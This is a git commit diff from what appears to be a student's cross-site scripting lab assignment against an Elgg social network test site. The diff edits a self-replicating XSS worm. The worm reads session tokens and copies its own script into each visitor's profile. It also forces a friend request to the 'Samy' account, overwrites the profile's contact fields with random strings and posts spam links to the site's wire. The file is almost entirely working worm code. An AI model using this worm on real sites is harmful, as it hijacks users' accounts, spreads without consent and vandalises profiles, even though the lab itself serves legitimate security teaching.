c3464f6811c0f2382d9b05118321981074df929a
Mahathir <mirmahathir1@gmail.com>
2021-06-25 01:01:40 +0600

    xss: edited task 4

--- level4term1/Security/xss/1605011_/1605011_Task_4.js
+++ level4term1/Security/xss/1605011_/1605011_Task_4.js
@@ -1,30 +1,42 @@
+function randomString(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {result += characters.charAt(Math.floor(Math.random() * charactersLength));}
+    return result;
+}
 
 window.onload = function () {
-
     var headerTag = "<script id=\"worm\">";
     var innerCode = document.getElementById("worm").innerHTML;
     var tailTag = "</"+"script>";
 
     var wormCode = encodeURIComponent(headerTag+innerCode+tailTag);
-
-    
-    
     
     var name = elgg.session.user.name;
     var guid = "&guid="+elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    var briefDesc = "&briefdescription=Samy is my hero"+ "&accesslevel[briefdescription]=2";
-    var desc = "&description="+ wormCode + "&accesslevel[description]=2";
-    
-    
-    
-    
+    var briefDesc = "&briefdescription="+wormCode+"&accesslevel[briefdescription]=1";
+    var description = "&description=1605011&accesslevel[description]=1";
+    var contactemail = "&contactemail="+randomString(10)+"&accesslevel[contactemail]=1";
+    var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
+    var location = "&location="+randomString(10)+"&accesslevel[location]=1";
+    var mobile = "&mobile="+randomString(10)+"&accesslevel[mobile]=1";
+    var phone = "&phone="+randomString(10)+"&accesslevel[phone]=1";
+    var skills = "&skills="+randomString(10)+"&accesslevel[skills]=1";
+    var twitter = "&twitter="+randomString(10)+"&accesslevel[twitter]=1";
+    var website = "&website="+randomString(10)+"&accesslevel[website]=1";
+    var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
+    var editContent = name + guid + ts + token + briefDesc + description + contactemail + interests + location + mobile + phone + skills + twitter + website;
+
     var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
+    let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
+    var body = "&body="+link;
     
-    var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
-    var content = name + guid + ts + token + briefDesc + desc;
+    var sendurlWirePost = "http://www.xsslabelgg.com/action/thewire/add";
+    var contentWirePost = ts + token + body;
 
     var samyGuid = 47;
 
@@ -35,7 +47,7 @@ window.onload = function () {
         Ajax.open("POST", sendurlPOST, true);
         Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        Ajax.send(content);
+        Ajax.send(editContent);
 
         
         Ajax = new XMLHttpRequest();
@@ -43,6 +55,13 @@ window.onload = function () {
         Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         Ajax.send();
+
+
+        Ajax = new XMLHttpRequest();
+        Ajax.open("POST", sendurlWirePost, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(contentWirePost);
     }
 
 }
